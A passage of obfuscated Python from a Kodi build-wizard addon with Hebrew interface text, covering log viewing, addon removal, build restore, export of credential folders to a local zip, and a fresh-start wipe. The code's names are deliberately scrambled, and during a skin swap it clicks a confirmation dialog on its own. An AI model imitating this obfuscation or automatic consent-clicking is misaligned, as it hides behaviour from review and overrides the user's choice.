			elif O0O000O0OOO000OO0 ==OOOO0O0O00OOO0000 .upload :OOOO0O0O00OOO0000 .close ();uploadLog .Main ()#line:4986
			elif O0O000O0OOO000OO0 ==OOOO0O0O00OOO0000 .kodi :#line:4987
				OOO0OO0OOOO000OO0 =wiz .Grab_Log (False )#line:4988
				OOOO00O0OO00OOO0O =wiz .Grab_Log (True )#line:4989
				if OOO0OO0OOOO000OO0 ==False :#line:4990
					OOOO0O0O00OOO0000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4991
					OOOO0O0O00OOO0000 .getControl (OOOO0O0O00OOO0000 .msg ).setText ("Log File Does Not Exists!")#line:4992
				else :#line:4993
					OOOO0O0O00OOO0000 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO00O0OO00OOO0O .replace (LOG ,''))#line:4994
					OOOO0O0O00OOO0000 .getControl (OOOO0O0O00OOO0000 .title ).setLabel (OOOO0O0O00OOO0000 .titlemsg )#line:4995
					OOOO0O0O00OOO0000 .getControl (OOOO0O0O00OOO0000 .msg ).setText (wiz .highlightText (OOO0OO0OOOO000OO0 ))#line:4996
					OOOO0O0O00OOO0000 .setFocusId (OOOO0O0O00OOO0000 .scrollbar )#line:4997
			elif O0O000O0OOO000OO0 ==OOOO0O0O00OOO0000 .kodiold :#line:4998
				OOO0OO0OOOO000OO0 =wiz .Grab_Log (False ,True )#line:4999
				OOOO00O0OO00OOO0O =wiz .Grab_Log (True ,True )#line:5000
				if OOO0OO0OOOO000OO0 ==False :#line:5001
					OOOO0O0O00OOO0000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:5002
					OOOO0O0O00OOO0000 .getControl (OOOO0O0O00OOO0000 .msg ).setText ("Log File Does Not Exists!")#line:5003
				else :#line:5004
					OOOO0O0O00OOO0000 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO00O0OO00OOO0O .replace (LOG ,''))#line:5005
					OOOO0O0O00OOO0000 .getControl (OOOO0O0O00OOO0000 .title ).setLabel (OOOO0O0O00OOO0000 .titlemsg )#line:5006
					OOOO0O0O00OOO0000 .getControl (OOOO0O0O00OOO0000 .msg ).setText (wiz .highlightText (OOO0OO0OOOO000OO0 ))#line:5007
					OOOO0O0O00OOO0000 .setFocusId (OOOO0O0O00OOO0000 .scrollbar )#line:5008
			elif O0O000O0OOO000OO0 ==OOOO0O0O00OOO0000 .wizard :#line:5009
				OOO0OO0OOOO000OO0 =wiz .Grab_Log (False ,False ,True )#line:5010
				OOOO00O0OO00OOO0O =wiz .Grab_Log (True ,False ,True )#line:5011
				if OOO0OO0OOOO000OO0 ==False :#line:5012
					OOOO0O0O00OOO0000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:5013
					OOOO0O0O00OOO0000 .getControl (OOOO0O0O00OOO0000 .msg ).setText ("Log File Does Not Exists!")#line:5014
				else :#line:5015
					OOOO0O0O00OOO0000 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO00O0OO00OOO0O .replace (ADDONDATA ,''))#line:5016
					OOOO0O0O00OOO0000 .getControl (OOOO0O0O00OOO0000 .title ).setLabel (OOOO0O0O00OOO0000 .titlemsg )#line:5017
					OOOO0O0O00OOO0000 .getControl (OOOO0O0O00OOO0000 .msg ).setText (wiz .highlightText (OOO0OO0OOOO000OO0 ))#line:5018
					OOOO0O0O00OOO0000 .setFocusId (OOOO0O0O00OOO0000 .scrollbar )#line:5019
		def onAction (O00OO00OO0000000O ,OOO0000O0OO00OO00 ):#line:5021
			if OOO0000O0OO00OO00 ==ACTION_PREVIOUS_MENU :O00OO00OO0000000O .close ()#line:5022
			elif OOO0000O0OO00OO00 ==ACTION_NAV_BACK :O00OO00OO0000000O .close ()#line:5023
	if default ==None :default =wiz .Grab_Log (True )#line:5024
	OO0O0OO0O000OO000 =O00O0O0OOOOO000OO ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:5025
	OO0O0OO0O000OO000 .doModal ()#line:5026
	del OO0O0OO0O000OO000 #line:5027
def removeAddon (O0OOO00OOO0OO0O00 ,OOOOOO0OOO000O0O0 ,over =False ):#line:5029
	if not over ==False :#line:5030
		OO00OO000OO00000O =1 #line:5031
	else :#line:5032
		OO00OO000OO00000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOOO0OOO000O0O0 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O0OOO00OOO0OO0O00 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:5033
	if OO00OO000OO00000O ==1 :#line:5034
		OOOO000OO0O00O000 =os .path .join (ADDONS ,O0OOO00OOO0OO0O00 )#line:5035
		wiz .log ("Removing Addon %s"%O0OOO00OOO0OO0O00 )#line:5036
		wiz .cleanHouse (OOOO000OO0O00O000 )#line:5037
		xbmc .sleep (1000 )#line:5038
		try :shutil .rmtree (OOOO000OO0O00O000 )#line:5039
		except Exception as OO00OOOOO0O0O0OO0 :wiz .log ("Error removing %s"%O0OOO00OOO0OO0O00 ,xbmc .LOGNOTICE )#line:5040
		removeAddonData (O0OOO00OOO0OO0O00 ,OOOOOO0OOO000O0O0 ,over )#line:5041
	if over ==False :#line:5042
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OOOOOO0OOO000O0O0 ))#line:5043
def removeAddonData (OOO0OOOO0O0OOO0OO ,name =None ,over =False ):#line:5045
	if OOO0OOOO0O0OOO0OO =='all':#line:5046
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5047
			wiz .cleanHouse (ADDOND )#line:5048
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5049
	elif OOO0OOOO0O0OOO0OO =='uninstalled':#line:5050
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5051
			OO0OO0000O0000O00 =0 #line:5052
			for O0O0O0O0O000O00OO in glob .glob (os .path .join (ADDOND ,'*')):#line:5053
				OOO00O0000OO0OO00 =O0O0O0O0O000O00OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:5054
				if OOO00O0000OO0OO00 in EXCLUDES :pass #line:5055
				elif os .path .exists (os .path .join (ADDONS ,OOO00O0000OO0OO00 )):pass #line:5056
				else :wiz .cleanHouse (O0O0O0O0O000O00OO );OO0OO0000O0000O00 +=1 ;wiz .log (O0O0O0O0O000O00OO );shutil .rmtree (O0O0O0O0O000O00OO )#line:5057
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0OO0000O0000O00 ))#line:5058
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5059
	elif OOO0OOOO0O0OOO0OO =='empty':#line:5060
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5061
			OO0OO0000O0000O00 =wiz .emptyfolder (ADDOND )#line:5062
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0OO0000O0000O00 ))#line:5063
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5064
	else :#line:5065
		O0OO0OO00OO00000O =os .path .join (USERDATA ,'addon_data',OOO0OOOO0O0OOO0OO )#line:5066
		if OOO0OOOO0O0OOO0OO in EXCLUDES :#line:5067
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:5068
		elif os .path .exists (O0OO0OO00OO00000O ):#line:5069
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0OOOO0O0OOO0OO ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5070
				wiz .cleanHouse (O0OO0OO00OO00000O )#line:5071
				try :#line:5072
					shutil .rmtree (O0OO0OO00OO00000O )#line:5073
				except :#line:5074
					wiz .log ("Error deleting: %s"%O0OO0OO00OO00000O )#line:5075
			else :#line:5076
				wiz .log ('Addon data for %s was not removed'%OOO0OOOO0O0OOO0OO )#line:5077
	wiz .refresh ()#line:5078
def restoreit (OOO0OO0000O00O0OO ):#line:5080
	if OOO0OO0000O00O0OO =='build':#line:5081
		O00000OO0O0000O0O =freshStart ('restore')#line:5082
		if O00000OO0O0000O0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:5083
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.Premium.mod']:#line:5084
		wiz .skinToDefault ()#line:5085
	wiz .restoreLocal (OOO0OO0000O00O0OO )#line:5086
def restoreextit (O0OO000OOOO0O0OO0 ):#line:5088
	if O0OO000OOOO0O0OO0 =='build':#line:5089
		O00OOO0OOOOOO0OOO =freshStart ('restore')#line:5090
		if O00OOO0OOOOOO0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:5091
	wiz .restoreExternal (O0OO000OOOO0O0OO0 )#line:5092
def buildInfo (O00O0O0O0OOOO0O0O ):#line:5094
	if wiz .workingURL (SPEEDFILE )==True :#line:5095
		if wiz .checkBuild (O00O0O0O0OOOO0O0O ,'url'):#line:5096
			O00O0O0O0OOOO0O0O ,O0OOOO0OOOOO00000 ,OOO0O0O0O0OOOOOOO ,OOOO000O00000OO00 ,O000O0OOO0OOO00OO ,O0OO00O00O0O0OO0O ,O0O000O0OO0000000 ,OOOOOOOOOOO000O0O ,O0OOO0OOOOOO000O0 ,O0OOO00O0O00OO00O ,OO00OOOOOOO0OO00O =wiz .checkBuild (O00O0O0O0OOOO0O0O ,'all')#line:5097
			O0OOO00O0O00OO00O ='Yes'if O0OOO00O0O00OO00O .lower ()=='yes'else 'No'#line:5098
			O000000OOOO000OOO ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O0O0O0OOOO0O0O )#line:5099
			O000000OOOO000OOO +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOOO0OOOOO00000 )#line:5100
			if not O0OO00O00O0O0OO0O =="http://":#line:5101
				O00O0000OOO0OO0OO =wiz .themeCount (O00O0O0O0OOOO0O0O ,False )#line:5102
				O000000OOOO000OOO +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O00O0000OOO0OO0OO ))#line:5103
			O000000OOOO000OOO +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000O0OOO0OOO00OO )#line:5104
			O000000OOOO000OOO +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOO00O0O00OO00O )#line:5105
			O000000OOOO000OOO +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00OOOOOOO0OO00O )#line:5106
			wiz .TextBox (ADDONTITLE ,O000000OOOO000OOO )#line:5107
		else :wiz .log ("Invalid Build Name!")#line:5108
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5109
def buildVideo (OOO000O000OOOOO00 ):#line:5111
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:5112
	if wiz .workingURL (SPEEDFILE )==True :#line:5113
		O0000O0OO00OO0O0O =wiz .checkBuild (OOO000O000OOOOO00 ,'preview')#line:5114
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOO000O000OOOOO00 )#line:5115
		if O0000O0OO00OO0O0O and not O0000O0OO00OO0O0O =='http://':playVideo (O0000O0OO00OO0O0O )#line:5116
		else :wiz .log ("[%s]Unable to find url for video preview"%OOO000O000OOOOO00 )#line:5117
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5118
def dependsList (OO00OOOOO000O0O0O ):#line:5120
	O00O00OO000O00O0O =os .path .join (ADDONS ,OO00OOOOO000O0O0O ,'addon.xml')#line:5121
	if os .path .exists (O00O00OO000O00O0O ):#line:5122
		OOO000OO00OOOO00O =open (O00O00OO000O00O0O ,mode ='r');OO00OOO0OOO0OOO0O =OOO000OO00OOOO00O .read ();OOO000OO00OOOO00O .close ();#line:5123
		OO000000O0OO0O0OO =wiz .parseDOM (OO00OOO0OOO0OOO0O ,'import',ret ='addon')#line:5124
		O00O0000O0O0OO000 =[]#line:5125
		for OO00OOO0OOOO00O00 in OO000000O0OO0O0OO :#line:5126
			if not 'xbmc.python'in OO00OOO0OOOO00O00 :#line:5127
				O00O0000O0O0OO000 .append (OO00OOO0OOOO00O00 )#line:5128
		return O00O0000O0O0OO000 #line:5129
	return []#line:5130
def manageSaveData (O00O00OOOOO00OOOO ):#line:5132
	if O00O00OOOOO00OOOO =='import':#line:5133
		O0O0O0O0000O00OOO =os .path .join (ADDONDATA ,'temp')#line:5134
		if not os .path .exists (O0O0O0O0000O00OOO ):os .makedirs (O0O0O0O0000O00OOO )#line:5135
		O0O0O0O0OOOO000OO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:5136
		if not O0O0O0O0OOOO000OO .endswith ('.zip'):#line:5137
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:5138
			return #line:5139
		O0OOO00000O000O0O =os .path .join (MYBUILDS ,'SaveData.zip')#line:5140
		O000O0O0O00O00OO0 =xbmcvfs .copy (O0O0O0O0OOOO000OO ,O0OOO00000O000O0O )#line:5141
		wiz .log ("%s"%str (O000O0O0O00O00OO0 ))#line:5142
		extract .all (xbmc .translatePath (O0OOO00000O000O0O ),O0O0O0O0000O00OOO )#line:5143
		OOOOOOO0O0000O0OO =os .path .join (O0O0O0O0000O00OOO ,'trakt')#line:5144
		O000O00OO0OOOOOO0 =os .path .join (O0O0O0O0000O00OOO ,'login')#line:5145
		OOO0O0OO0O0O0OO00 =os .path .join (O0O0O0O0000O00OOO ,'debrid')#line:5146
		O000O00OOOOO0OOOO =0 #line:5147
		if os .path .exists (OOOOOOO0O0000O0OO ):#line:5148
			O000O00OOOOO0OOOO +=1 #line:5149
			OO000OO00O0O00O0O =os .listdir (OOOOOOO0O0000O0OO )#line:5150
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:5151
			for OOO00OO0000OO000O in OO000OO00O0O00O0O :#line:5152
				OOO000O00000OOO0O =os .path .join (traktit .TRAKTFOLD ,OOO00OO0000OO000O )#line:5153
				OOOOOO000OO00O00O =os .path .join (OOOOOOO0O0000O0OO ,OOO00OO0000OO000O )#line:5154
				if os .path .exists (OOO000O00000OOO0O ):#line:5155
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOO00OO0000OO000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5156
					else :os .remove (OOO000O00000OOO0O )#line:5157
				shutil .copy (OOOOOO000OO00O00O ,OOO000O00000OOO0O )#line:5158
			traktit .importlist ('all')#line:5159
			traktit .traktIt ('restore','all')#line:5160
		if os .path .exists (O000O00OO0OOOOOO0 ):#line:5161
			O000O00OOOOO0OOOO +=1 #line:5162
			OO000OO00O0O00O0O =os .listdir (O000O00OO0OOOOOO0 )#line:5163
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:5164
			for OOO00OO0000OO000O in OO000OO00O0O00O0O :#line:5165
				OOO000O00000OOO0O =os .path .join (loginit .LOGINFOLD ,OOO00OO0000OO000O )#line:5166
				OOOOOO000OO00O00O =os .path .join (O000O00OO0OOOOOO0 ,OOO00OO0000OO000O )#line:5167
				if os .path .exists (OOO000O00000OOO0O ):#line:5168
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOO00OO0000OO000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5169
					else :os .remove (OOO000O00000OOO0O )#line:5170
				shutil .copy (OOOOOO000OO00O00O ,OOO000O00000OOO0O )#line:5171
			loginit .importlist ('all')#line:5172
			loginit .loginIt ('restore','all')#line:5173
		if os .path .exists (OOO0O0OO0O0O0OO00 ):#line:5174
			O000O00OOOOO0OOOO +=1 #line:5175
			OO000OO00O0O00O0O =os .listdir (OOO0O0OO0O0O0OO00 )#line:5176
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:5177
			for OOO00OO0000OO000O in OO000OO00O0O00O0O :#line:5178
				OOO000O00000OOO0O =os .path .join (debridit .REALFOLD ,OOO00OO0000OO000O )#line:5179
				OOOOOO000OO00O00O =os .path .join (OOO0O0OO0O0O0OO00 ,OOO00OO0000OO000O )#line:5180
				if os .path .exists (OOO000O00000OOO0O ):#line:5181
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOO00OO0000OO000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5182
					else :os .remove (OOO000O00000OOO0O )#line:5183
				shutil .copy (OOOOOO000OO00O00O ,OOO000O00000OOO0O )#line:5184
			debridit .importlist ('all')#line:5185
			debridit .debridIt ('restore','all')#line:5186
		wiz .cleanHouse (O0O0O0O0000O00OOO )#line:5187
		wiz .removeFolder (O0O0O0O0000O00OOO )#line:5188
		os .remove (O0OOO00000O000O0O )#line:5189
		if O000O00OOOOO0OOOO ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:5190
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:5191
	elif O00O00OOOOO00OOOO =='export':#line:5192
		O00OOO00OOOOO0OOO =xbmc .translatePath (MYBUILDS )#line:5193
		O0OOOOO0O00000OO0 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:5194
		traktit .traktIt ('update','all')#line:5195
		loginit .loginIt ('update','all')#line:5196
		debridit .debridIt ('update','all')#line:5197
		O0O0O0O0OOOO000OO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:5198
		O0O0O0O0OOOO000OO =xbmc .translatePath (O0O0O0O0OOOO000OO )#line:5199
		O000OOOO0000O0O00 =os .path .join (O00OOO00OOOOO0OOO ,'SaveData.zip')#line:5200
		OO0O0O000O0O000O0 =zipfile .ZipFile (O000OOOO0000O0O00 ,mode ='w')#line:5201
		for OOOO00O0OOOOO00OO in O0OOOOO0O00000OO0 :#line:5202
			if os .path .exists (OOOO00O0OOOOO00OO ):#line:5203
				OO000OO00O0O00O0O =os .listdir (OOOO00O0OOOOO00OO )#line:5204
				for O00O000OO000O00OO in OO000OO00O0O00O0O :#line:5205
					OO0O0O000O0O000O0 .write (os .path .join (OOOO00O0OOOOO00OO ,O00O000OO000O00OO ),os .path .join (OOOO00O0OOOOO00OO ,O00O000OO000O00OO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:5206
		OO0O0O000O0O000O0 .close ()#line:5207
		if O0O0O0O0OOOO000OO ==O00OOO00OOOOO0OOO :#line:5208
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000OOOO0000O0O00 ))#line:5209
		else :#line:5210
			try :#line:5211
				xbmcvfs .copy (O000OOOO0000O0O00 ,os .path .join (O0O0O0O0OOOO000OO ,'SaveData.zip'))#line:5212
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0O0O0O0OOOO000OO ,'SaveData.zip')))#line:5213
			except :#line:5214
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000OOOO0000O0O00 ))#line:5215
def freshStart (install =None ,over =False ):#line:5220
	if USERNAME =='':#line:5221
		ADDON .openSettings ()#line:5222
		sys .exit ()#line:5223
	O00O0O0O0OO00O000 =(SPEEDFILE )#line:5224
	(O00O0O0O0OO00O000 )#line:5225
	OOO00O0O0OO0OOO0O =(wiz .workingURL (O00O0O0O0OO00O000 ))#line:5226
	(OOO00O0O0OO0OOO0O )#line:5227
	if KEEPTRAKT =='true':#line:5228
		traktit .autoUpdate ('all')#line:5229
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:5230
	if KEEPREAL =='true':#line:5231
		debridit .autoUpdate ('all')#line:5232
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:5233
	if KEEPLOGIN =='true':#line:5234
		loginit .autoUpdate ('all')#line:5235
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:5236
	if over ==True :O00OOO0OOO00OOOOO =1 #line:5237
	elif install =='restore':O00OOO0OOO00OOOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5238
	elif install :O00OOO0OOO00OOOOO =1 #line:5239
	else :O00OOO0OOO00OOOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5240
	if O00OOO0OOO00OOOOO :#line:5241
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5242
			O0OOO00OO0OOO0000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:5243
			skinSwitch .swapSkins (O0OOO00OO0OOO0000 )#line:5246
			OOOOO0O000O0O00O0 =0 #line:5247
			xbmc .sleep (1000 )#line:5248
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO0O000O0O00O0 <150 :#line:5249
				OOOOO0O000O0O00O0 +=1 #line:5250
				xbmc .sleep (1000 )#line:5251
				wiz .ebi ('SendAction(Select)')#line:5252
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:5253
				wiz .ebi ('SendClick(11)')#line:5254
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:5255
			xbmc .sleep (1000 )#line:5256
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5257
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:5258
			return #line:5259
		wiz .addonUpdates ('set')#line:5260
		O00O0OO0O0O0OOOOO =os .path .abspath (HOME )#line:5261
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:5262
		O0OO00O000000O000 =sum ([len (OO00O00O0000O00OO )for O0OO00O0OOOO0O0OO ,OOOO00OO0OOO00O00 ,OO00O00O0000O00OO in os .walk (O00O0OO0O0O0OOOOO )]);OOO00O0O0O0OO0O00 =0 #line:5263
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:5264
		EXCLUDES .append ('My_Builds')#line:5265
		EXCLUDES .append ('archive_cache')#line:5266
		EXCLUDES .append ('script.module.requests')#line:5267
		EXCLUDES .append ('myfav.anon')#line:5268
		if KEEPREPOS =='true':#line:5269
			OOOO0O0000O00O0OO =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:5270
			for O0O0OO000000O0OO0 in OOOO0O0000O00O0OO :#line:5271
				OOO0O0000OOO00O00 =os .path .split (O0O0OO000000O0OO0 [:-1 ])[1 ]#line:5272
				if not OOO0O0000OOO00O00 ==EXCLUDES :#line:5273
					EXCLUDES .append (OOO0O0000OOO00O00 )#line:5274
		if KEEPSUPER =='true':#line:5275
			EXCLUDES .append ('plugin.program.super.favourites')#line:5276
		if KEEPMOVIELIST =='true':#line:5277
			EXCLUDES .append ('plugin.video.metalliq')#line:5278
		if KEEPMOVIELIST =='true':#line:5279
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:5280
		if KEEPADDONS =='true':#line:5281
			EXCLUDES .append ('addons')#line:5282
		if KEEPTELEMEDIA =='true':#line:5283
			EXCLUDES .append ('plugin.video.telemedia')#line:5284
		EXCLUDES .append ('plugin.video.elementum')#line:5289
		EXCLUDES .append ('script.elementum.burst')#line:5290
		EXCLUDES .append ('script.elementum.burst-master')#line:5291
		EXCLUDES .append ('plugin.video.quasar')#line:5292
		EXCLUDES .append ('script.quasar.burst')#line:5293
		EXCLUDES .append ('skin.estuary')#line:5294
		if KEEPWHITELIST =='true':#line:5297
			OO0OOOOO000OOO000 =''#line:5298
			OO00000O0O0000000 =wiz .whiteList ('read')#line:5299
			if len (OO00000O0O0000000 )>0 :#line:5300
				for O0O0OO000000O0OO0 in OO00000O0O0000000 :#line:5301
					try :O0O0OOO00O00O0O00 ,OO0O000O00O0000OO ,OOO000O0000O0OOOO =O0O0OO000000O0OO0 #line:5302
					except :pass #line:5303
					if OOO000O0000O0OOOO .startswith ('pvr'):OO0OOOOO000OOO000 =OO0O000O00O0000OO #line:5304
					OO0OOOOOO000O000O =dependsList (OOO000O0000O0OOOO )#line:5305
					for O0O0OOOOOOO0O00O0 in OO0OOOOOO000O000O :#line:5306
						if not O0O0OOOOOOO0O00O0 in EXCLUDES :#line:5307
							EXCLUDES .append (O0O0OOOOOOO0O00O0 )#line:5308
						OO0O0OO00O00O0OOO =dependsList (O0O0OOOOOOO0O00O0 )#line:5309
						for OOOO00O0OO0O0OOO0 in OO0O0OO00O00O0OOO :#line:5310
							if not OOOO00O0OO0O0OOO0 in EXCLUDES :#line:5311
								EXCLUDES .append (OOOO00O0OO0O0OOO0 )#line:5312
					if not OOO000O0000O0OOOO in EXCLUDES :#line:5313
						EXCLUDES .append (OOO000O0000O0OOOO )#line:5314
				if not OO0OOOOO000OOO000 =='':wiz .setS ('pvrclient',OOO000O0000O0OOOO )#line:5315
		if wiz .getS ('pvrclient')=='':#line:5316
			for O0O0OO000000O0OO0 in EXCLUDES :#line:5317
				if O0O0OO000000O0OO0 .startswith ('pvr'):#line:5318
					wiz .setS ('pvrclient',O0O0OO000000O0OO0 )#line:5319
